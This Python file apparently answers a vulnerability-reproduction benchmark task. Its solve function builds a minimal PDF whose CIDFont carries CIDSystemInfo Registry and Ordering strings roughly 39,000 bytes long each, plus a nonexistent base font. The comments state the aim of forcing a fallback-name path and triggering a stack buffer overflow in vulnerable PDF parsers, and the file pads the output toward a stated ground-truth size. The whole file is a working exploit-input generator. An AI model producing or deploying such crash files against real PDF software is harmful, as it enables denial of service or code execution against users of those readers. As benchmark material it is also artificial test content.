import os
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a minimal PDF that contains a CIDFont with an extremely long
        # CIDSystemInfo Registry and Ordering strings, so that any fallback
        # name using "<Registry>-<Ordering>" can trigger a stack buffer overflow
        # in vulnerable parsers.
        #
        # The PDF is well-formed with a single page and a single Type0 font
        # referencing a CIDFont that does not exist, encouraging fallback.
        #
        # We aim for a size near the provided ground-truth length (80064 bytes),
        # but correctness does not strictly depend on matching the exact size.
        # We'll generate Registry and Ordering strings of identical length that
        # sum to roughly 80k with overhead.
        #
        # Choose lengths for Registry and Ordering strings.
        # We target combined length ~ 78000 and leave room for PDF overhead.
        # Each string length:
        target_total = 80064
        overhead_estimate = 1800  # rough overhead for PDF structure
        payload_total = max(60000, target_total - overhead_estimate)
        # split payload between registry and ordering equally
        reg_len = payload_total // 2
        ord_len = payload_total - reg_len

        # Ensure lengths are sensible
        reg_len = max(1000, reg_len)
        ord_len = max(1000, ord_len)

        registry = b"A" * reg_len
        ordering = b"B" * ord_len

        # Build content stream (simple "Hello")
        stream_data = b"BT /F1 24 Tf 72 720 Td (Hello) Tj ET\n"

        # Construct objects
        objects = []

        def obj_bytes(num, content_bytes):
            return (f"{num} 0 obj\n".encode("latin1") +
                    content_bytes +
                    b"\nendobj\n")

        # 1: Catalog
        obj1 = b"<< /Type /Catalog /Pages 2 0 R >>"
        objects.append(obj1)

        # 2: Pages
        obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        objects.append(obj2)

        # 3: Page
        obj3 = (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
                b"/Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>")
        objects.append(obj3)

        # 4: Contents stream
        obj4 = (b"<< /Length " + str(len(stream_data)).encode("latin1") + b" >>\n" +
                b"stream\n" + stream_data + b"endstream")
        objects.append(obj4)

        # 5: Type0 font referencing CIDFont (6 0 R)
        # Use Identity-H to ensure CIDFont usage path; BaseFont arbitrary
        obj5 = (b"<< /Type /Font /Subtype /Type0 /BaseFont /XYZIdentity-H "
                b"/Encoding /Identity-H /DescendantFonts [6 0 R] >>")
        objects.append(obj5)

        # 6: CIDFont with oversized CIDSystemInfo strings to drive fallback name
        cid_system_info = (b"<< /Registry (" + registry + b") /Ordering (" + ordering + b") /Supplement 0 >>")
        obj6 = (b"<< /Type /Font /Subtype /CIDFontType2 "
                b"/BaseFont /NonExistentCIDFont "
                b"/CIDSystemInfo " + cid_system_info + b" "
                b"/DW 1000 /W [0 [500]] >>")
        objects.append(obj6)

        # Assemble PDF
        header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        pdf = bytearray()
        pdf += header

        offsets = [0]  # xref requires object 0; offsets[1] corresponds to obj 1 offset
        for i, content in enumerate(objects, start=1):
            offsets.append(len(pdf))
            pdf += obj_bytes(i, content)

        # xref
        xref_offset = len(pdf)
        nobj = len(objects)
        xref = bytearray()
        xref += b"xref\n"
        xref += f"0 {nobj+1}\n".encode("latin1")
        xref += b"0000000000 65535 f \n"
        for i in range(1, nobj + 1):
            xref += f"{offsets[i]:010d} 00000 n \n".encode("latin1")
        pdf += xref

        # trailer
        trailer = (b"trailer\n<< /Size " + str(nobj + 1).encode("latin1") +
                   b" /Root 1 0 R >>\nstartxref\n" +
                   str(xref_offset).encode("latin1") + b"\n%%EOF\n")
        pdf += trailer

        # If the size is significantly below target_total, pad with a PDF comment.
        # Padding after %%EOF is generally ignored by readers, but to be safer,
        # insert the padding before %%EOF by rebuilding trailer with padding as a comment.
        # However, to avoid re-assembling, if needed, append trailing comment padding.
        final = bytes(pdf)
        if len(final) < target_total:
            padding_needed = target_total - len(final)
            # Append as trailing comment lines; many parsers ignore trailing bytes.
            final += b"%PAD" + b"P" * max(0, padding_needed - 4)

        return final